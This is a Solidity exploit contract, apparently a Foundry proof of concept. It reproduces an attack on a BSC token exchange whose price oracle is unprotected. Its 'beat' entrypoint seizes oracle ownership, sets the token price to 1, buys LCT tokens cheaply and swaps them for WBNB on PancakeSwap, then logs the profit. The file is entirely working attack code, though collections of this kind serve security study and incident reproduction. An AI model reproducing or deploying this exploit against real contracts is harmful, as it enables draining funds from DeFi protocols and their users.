import {RuinLocation} from "./ruins/RuinLocation.sol";

import {
    PANCAKE_ROUTER,
    WBNB
} from "../../constants/bsc.sol";

import {IERC20} from "../../interfaces/tokens/IERC20.sol";
import {IPancakeRouter} from "../../interfaces/dex/pancakeswap/IPancakeRouter.sol";

import "forge-std/console.sol";

interface ILCTEx {
    function buyTokens() external payable returns (uint, uint);
}

contract Shaman is RuinLocation {
    constructor() public payable {}

    function peek() external {
        
        (bool success,bytes memory data) = ORACLE.staticcall(abi.encode(ORACLE_GETTOKENPRICE_SELECTOR));
        console.log("StaticCall status = %s, return data:", success);
        console.logBytes(data);
    }

    // attack entrypoint
    function beat() external {
        ORACLE.call(abi.encodeWithSelector(ORACLE_SETOWNER_SELECTOR, address(this)));
        ORACLE.call(abi.encodeWithSelector(ORACLE_SETPRICE_SELECTOR, 1));

        ILCTEx(LCT_EX).buyTokens{value: address(this).balance}();

        uint _lctAmount = IERC20(LCT).balanceOf(address(this));
        IERC20(LCT).approve(PANCAKE_ROUTER, _lctAmount);
        address[] memory _path = new address[](2);
        _path[0] = LCT;
        _path[1] = WBNB;
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokens(
            _lctAmount, 1, _path, address(this), block.timestamp);

        console.log("[>*BOOM*<] Profit = %s WBNB", IERC20(WBNB).balanceOf(address(this)));
    }
}